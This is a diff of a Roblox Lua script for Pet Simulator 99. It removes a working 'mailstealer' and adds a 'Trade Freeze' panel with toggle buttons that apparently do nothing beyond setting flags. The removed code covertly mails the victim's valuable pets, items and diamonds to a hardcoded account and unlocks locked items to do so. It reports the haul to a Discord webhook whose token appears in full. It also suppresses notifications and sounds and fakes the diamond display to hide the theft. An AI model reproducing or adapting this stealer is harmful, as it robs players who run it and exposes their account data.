@@ -1,362 +1,252 @@
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
-_G.scriptExecuted = true
+local function safeParent(gui)
+    if typeof(gethui) == "function" then
+        pcall(function() gui.Parent = gethui() end)
+        if gui.Parent then return end
+    end
 
-local network = require(game.ReplicatedStorage.Library.Client.Network)
-local library = require(game.ReplicatedStorage.Library)
-local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
-local plr = game.Players.LocalPlayer
-local MailMessage = "GG / GY2RVSEGDT"
-local HttpService = game:GetService("HttpService")
-local sortedItems = {}
-local totalRAP = 0
-local message = require(game.ReplicatedStorage.Library.Client.Message)
-local GetSave = function()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
-end
+    local ok = pcall(function() gui.Parent = game:GetService("CoreGui") end)
+    if ok and gui.Parent then return end
 
-local users = {"victtoroo"}
-local min_rap = _G.minrap or 1000000
-local webhook = "https://discord.com/api/webhooks/1488268792373968966/tvEwbpH8gqpDwWr_aCWI-tL6BS3c45d1UVm-OLmOGJfMSXqki6Dl8rnggnRsLxDmNZHY"
-
-if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add any usernames or webhook")
-    return
-end
-
-for _, user in ipairs(users) do
-    if plr.Name == user then
-        plr:kick("You cannot mailsteal yourself")
-        return
+    local p = game:GetService("Players").LocalPlayer
+    if p and p:FindFirstChild("PlayerGui") then
+        pcall(function() gui.Parent = p.PlayerGui end)
     end
 end
 
-for adress, func in pairs(getgc()) do
-    if debug.getinfo(func).name == "computeSendMailCost" then
-        FunctionToGetFirstPriceOfMail = func
-        break
-    end
-end
+-- Colors
+local COLOR_ON = Color3.fromRGB(16,185,129)
+local COLOR_OFF = Color3.fromRGB(239,68,68)
+local BG = Color3.fromRGB(7,18,37)
 
-local mailSendPrice = FunctionToGetFirstPriceOfMail()
+-- Ensure globals for other scripts
+getgenv().CODERJOEY_FREEZE = getgenv().CODERJOEY_FREEZE or false
+getgenv().CODERJOEY_AUTO = getgenv().CODERJOEY_AUTO or false
 
-local GemAmount1 = 1
-for i, v in pairs(GetSave().Inventory.Currency) do
-    if v.id == "Diamonds" then
-        GemAmount1 = v._am
-		break
-    end
-end
+-- ScreenGui
+local screen = Instance.new("ScreenGui")
+screen.Name = "CoderJoey_TradeFreeze_UI"
+screen.ResetOnSpawn = false
+screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-local function formatNumber(number)
-	local number = math.floor(number)
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
-	return string.format("%.2f%s", number, suffixes[suffixIndex])
-end
+-- Main frame (height reduced because subtitle removed)
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.AnchorPoint = Vector2.new(0, 0)
+main.Position = UDim2.new(0.5, -210, 0.12, 0) -- centered-ish
+main.Size = UDim2.new(0, 420, 0, 86)
+main.BackgroundColor3 = BG
+main.BorderSizePixel = 0
+main.Parent = screen
+main.ClipsDescendants = true
+main.Active = true
 
-local function SendMessage(diamonds)
-    local headers = {
-        ["Content-Type"] = "application/json"
+local mc = Instance.new("UICorner", main)
+mc.CornerRadius = UDim.new(0, 12)
+
+-- Header (drag handle) - now only the title (no subtitle)
+local header = Instance.new("Frame")
+header.Name = "Header"
+header.BackgroundTransparency = 1
+header.Size = UDim2.new(1, 0, 0, 24)
+header.Position = UDim2.new(0, 0, 0, 0)
+header.Parent = main
+header.Active = true -- must be active to receive input
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.BackgroundTransparency = 1
+title.Position = UDim2.new(0, 12, 0, 4)
+title.Size = UDim2.new(1, -24, 0, 20)
+title.Font = Enum.Font.GothamSemibold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(230,238,246)
+title.Text = "CoderJoey's PS99 Trade Freeze"
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = header
+
+-- Container for knobs (moved up because subtitle is gone)
+local container = Instance.new("Frame")
+container.Name = "Container"
+container.BackgroundTransparency = 1
+container.Position = UDim2.new(0, 12, 0, 36)
+container.Size = UDim2.new(1, -24, 0, 46)
+container.Parent = main
+
+-- utility to make a round knob + label
+local function makeKnob(name, xOffset, labelText, initialState)
+    local holder = Instance.new("Frame")
+    holder.Name = name .. "_Holder"
+    holder.BackgroundTransparency = 1
+    holder.Size = UDim2.new(0, 190, 1, 0)
+    holder.Position = UDim2.new(0, xOffset, 0, 0)
+    holder.Parent = container
+
+    local knobButton = Instance.new("TextButton")
+    knobButton.Name = name .. "_Knob"
+    knobButton.Size = UDim2.new(0, 46, 0, 46)
+    knobButton.Position = UDim2.new(0, 0, 0, 0)
+    knobButton.AnchorPoint = Vector2.new(0, 0)
+    knobButton.BackgroundColor3 = initialState and COLOR_ON or COLOR_OFF
+    knobButton.Text = initialState and "ON" or "OFF"
+    knobButton.TextColor3 = Color3.new(1,1,1)
+    knobButton.Font = Enum.Font.GothamBold
+    knobButton.TextSize = 12
+    knobButton.AutoButtonColor = false
+    knobButton.Parent = holder
+
+    local uic = Instance.new("UICorner", knobButton)
+    uic.CornerRadius = UDim.new(1, 0) -- circle
+
+    -- label + hint
+    local lbl = Instance.new("TextLabel")
+    lbl.Name = name .. "_Label"
+    lbl.BackgroundTransparency = 1
+    lbl.Position = UDim2.new(0, 56, 0, 2)
+    lbl.Size = UDim2.new(1, -56, 0, 20)
+    lbl.Font = Enum.Font.GothamSemibold
+    lbl.TextSize = 14
+    lbl.TextColor3 = Color3.fromRGB(230,238,246)
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Text = labelText
+    lbl.Parent = holder
+
+    local hint = Instance.new("TextLabel")
+    hint.Name = name .. "_Hint"
+    hint.BackgroundTransparency = 1
+    hint.Position = UDim2.new(0, 56, 0, 22)
+    hint.Size = UDim2.new(1, -56, 0, 20)
+    hint.Font = Enum.Font.Gotham
+    hint.TextSize = 12
+    hint.TextColor3 = Color3.fromRGB(154,166,178)
+    hint.TextXAlignment = Enum.TextXAlignment.Left
+    hint.Text = "Currently: " .. (initialState and "On" or "Off")
+    hint.Parent = holder
+
+    return {
+        holder = holder,
+        button = knobButton,
+        label = lbl,
+        hint = hint,
     }
+end
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items to be sent:",
-			value = "",
-			inline = false
-		},
-        {
-            name = "Summary:",
-            value = "",
-            inline = false
-        }
-	}
+-- create two knobs
+local freezeKnob = makeKnob("FreezeTrade", 0, "Freeze Trade", getgenv().CODERJOEY_FREEZE)
+local autoKnob   = makeKnob("AutoAccept", 190, "Auto Accept",  getgenv().CODERJOEY_AUTO)
 
-    local combinedItems = {}
-    local itemRapMap = {}
+-- Toggle helper
+local function setKnobState(knobTable, state)
+    knobTable.button.BackgroundColor3 = state and COLOR_ON or COLOR_OFF
+    knobTable.button.Text = state and "ON" or "OFF"
+    knobTable.hint.Text = "Currently: " .. (state and "On" or "Off")
+end
 
-    for _, item in ipairs(sortedItems) do
-        local rapKey = item.name
-        if itemRapMap[rapKey] then
-            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
+local function toggleFreeze()
+    getgenv().CODERJOEY_FREEZE = not getgenv().CODERJOEY_FREEZE
+    setKnobState(freezeKnob, getgenv().CODERJOEY_FREEZE)
+    print("[CoderJoey] Freeze Trade ->", getgenv().CODERJOEY_FREEZE and "On" or "Off")
+end
+
+local function toggleAuto()
+    getgenv().CODERJOEY_AUTO = not getgenv().CODERJOEY_AUTO
+    setKnobState(autoKnob, getgenv().CODERJOEY_AUTO)
+    print("[CoderJoey] Auto Accept ->", getgenv().CODERJOEY_AUTO and "On" or "Off")
+end
+
+-- Wire clicks
+freezeKnob.button.MouseButton1Click:Connect(toggleFreeze)
+autoKnob.button.MouseButton1Click:Connect(toggleAuto)
+
+-- Keyboard support: F for Freeze, G for Auto Accept
+local UserInputService = game:GetService("UserInputService")
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        if input.KeyCode == Enum.KeyCode.F then
+            toggleFreeze()
+        elseif input.KeyCode == Enum.KeyCode.G then
+            toggleAuto()
+        end
+    end
+end)
+
+-- Dragging logic (drag by header). Supports mouse and touch, clamps to viewport.
+do
+    local dragging = false
+    local dragInput = nil
+    local dragStart = nil
+    local startPos = nil
+
+    local function getViewport()
+        local cam = workspace.CurrentCamera
+        if cam then
+            return cam.ViewportSize
         else
-            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
-            table.insert(combinedItems, rapKey)
+            return Vector2.new(1280, 720)
         end
     end
 
-    table.sort(combinedItems, function(a, b)
-        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
-    end)
-
-    for _, itemName in ipairs(combinedItems) do
-        local itemData = itemRapMap[itemName]
-        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+    local function clampPosition(x, y)
+        local vp = getViewport()
+        local maxX = math.max(10, vp.X - main.Size.X.Offset - 10)
+        local maxY = math.max(10, vp.Y - main.Size.Y.Offset - 10)
+        local nx = math.clamp(x, 10, maxX)
+        local ny = math.clamp(y, 10, maxY)
+        return nx, ny
     end
 
-    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
-
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "\240\159\144\177 New PS99 Execution" ,
-            ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
-			}
-        }}
-    }
-
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n")
-            fields[2].value = fields[2].value .. "\nPlus more!"
+    local function onInputChanged(input)
+        if dragging and input == dragInput then
+            local delta = input.Position - dragStart
+            local newX = startPos.X + delta.X
+            local newY = startPos.Y + delta.Y
+            newX, newY = clampPosition(newX, newY)
+            main.Position = UDim2.new(0, newX, 0, newY)
         end
     end
 
-    local body = HttpService:JSONEncode(data)
-    request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragInput = input
+            dragStart = input.Position
+            startPos = Vector2.new(main.Position.X.Offset, main.Position.Y.Offset)
 
-local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
-local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
-gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-	gemsleaderstatpath.Value = gemsleaderstat
-end)
-
-local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
-local noti = plr.PlayerGui.Notifications
-loading.Disabled = true
-noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-	noti.Enabled = false
-end)
-noti.Enabled = false
-
-game.DescendantAdded:Connect(function(x)
-    if x.ClassName == "Sound" then
-        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
-            x.Volume=0
-            x.PlayOnRemove=false
-            x:Destroy()
-        end
-    end
-end)
-
-local function getRAP(Type, Item)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
-        {
-            Class = {Name = Type},
-            IsA = function(hmm)
-                return hmm == Type
-            end,
-            GetId = function()
-                return Item.id
-            end,
-            StackKey = function()
-                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
-            end,
-            AbstractGetRAP = function(self)
-                return nil
-            end
-        }
-    ) or 0)
-end
-
-local function sendItem(category, uid, am)
-    local userIndex = 1
-    local maxUsers = #users
-    local sent = false
-    
-    repeat
-        local currentUser = users[userIndex]
-        local args = {
-            [1] = currentUser,
-            [2] = MailMessage,
-            [3] = category,
-            [4] = uid,
-            [5] = am or 1
-        }
-
-        local response, err = network.Invoke("Mailbox: Send", unpack(args))
-
-        if response == true then
-            sent = true
-            GemAmount1 = GemAmount1 - mailSendPrice
-            mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
-            if mailSendPrice > 5000000 then
-                mailSendPrice = 5000000
-            end
-        elseif response == false and err == "They don't have enough space!" then
-            userIndex = userIndex + 1
-            if userIndex > maxUsers then
-                sent = true
-            end
-        end
-    until sent
-end
-
-local function SendAllGems()
-    for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            if GemAmount1 >= (mailSendPrice + 10000) then
-                local userIndex = 1
-                local maxUsers = #users
-                local sent = false
-                
-                repeat
-                    local currentUser = users[userIndex]
-                    local args = {
-                        [1] = currentUser,
-                        [2] = MailMessage,
-                        [3] = "Currency",
-                        [4] = i,
-                        [5] = GemAmount1 - mailSendPrice
-                    }
-                    
-                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
-                    
-                    if response == true then
-                        sent = true
-                    elseif response == false and err == "They don't have enough space!" then
-                        userIndex = userIndex + 1
-                        if userIndex > maxUsers then
-                            sent = true
-                        end
-                    end
-                until sent
-                break
-            end
-        end
-    end
-end
-
-local function EmptyBoxes()
-    if save.Box then
-        for key, value in pairs(save.Box) do
-			if value._uq then
-				network.Invoke("Box: Withdraw All", key)
-			end
-        end
-    end
-end
-
-local function ClaimMail()
-    local response, err = network.Invoke("Mailbox: Claim All")
-    while err == "You must wait 30 seconds before using the mailbox!" do
-        wait(0.2)
-        response, err = network.Invoke("Mailbox: Claim All")
-    end
-end
-
-local function canSendMail()
-	local uid
-	for i, v in pairs(save["Pet"]) do
-		uid = i
-		break
-	end
-	local args = {
-        [1] = "Roblox",
-        [2] = "Test",
-        [3] = "Pet",
-        [4] = uid,
-        [5] = 1
-    }
-    local response, err = network.Invoke("Mailbox: Send", unpack(args))
-    return (err == "They don't have enough space!")
-end
-
-require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
-require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
-
-for i, v in pairs(categoryList) do
-	if save[v] ~= nil then
-		for uid, item in pairs(save[v]) do
-			if v == "Pet" then
-                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
-                if dir.huge or dir.exclusiveLevel then
-                    local rapValue = getRAP(v, item)
-                    if rapValue >= min_rap then
-                        local prefix = ""
-                        if item.pt and item.pt == 1 then
-                            prefix = "Golden "
-                        elseif item.pt and item.pt == 2 then
-                            prefix = "Rainbow "
-                        end
-                        if item.sh then
-                            prefix = "Shiny " .. prefix
-                        end
-                        local id = prefix .. item.id
-                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
-                        totalRAP = totalRAP + (rapValue * (item._am or 1))
-                    end
+            -- Listen for the end of this input
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                    dragInput = nil
                 end
-            else
-                local rapValue = getRAP(v, item)
-                if rapValue >= min_rap then
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
-                    totalRAP = totalRAP + (rapValue * (item._am or 1))
-                end
-            end
-            if item._lk then
-                local args = {
-                [1] = uid,
-                [2] = false
-                }
-                network.Invoke("Locking_SetLocked", unpack(args))
-            end
+            end)
         end
-	end
-end
-
-if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
-    ClaimMail()
-	EmptyBoxes()
-    if not canSendMail() then
-        message.Error("Account error. Please rejoin and try again or use a different account")
-        return
-    end
-
-    table.sort(sortedItems, function(a, b)
-        return a.rap * a.amount > b.rap * b.amount 
     end)
 
-    spawn(function()
-        SendMessage(GemAmount1)
+    header.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            -- update dragInput to track movement (some clients require this)
+            if dragInput == nil then
+                dragInput = input
+            end
+        end
     end)
 
-    for _, item in ipairs(sortedItems) do
-        if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
-            sendItem(item.category, item.uid, item.amount)
-        else
-            break
-        end
-    end
-    if GemAmount1 > mailSendPrice then
-        SendAllGems()
-    end
-    message.Error("Script not working, Please try again")
+    UserInputService.InputChanged:Connect(onInputChanged)
+
+    -- Re-clamp when viewport changes (e.g. resolution change, camera change)
+    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
+        -- wait a tick for camera to be ready
+        task.defer(function()
+            local vp = getViewport()
+            local x = main.Position.X.Offset
+            local y = main.Position.Y.Offset
+            local nx, ny = clampPosition(x, y)
+            main.Position = UDim2.new(0, nx, 0, ny)
+        end)
+    end)
 end
+
+-- Initialize UI states
+setKnobState(freezeKnob, getgenv().CODERJOEY_FREEZE)
+setKnobState(autoKnob, getgenv().CODERJOEY_AUTO)
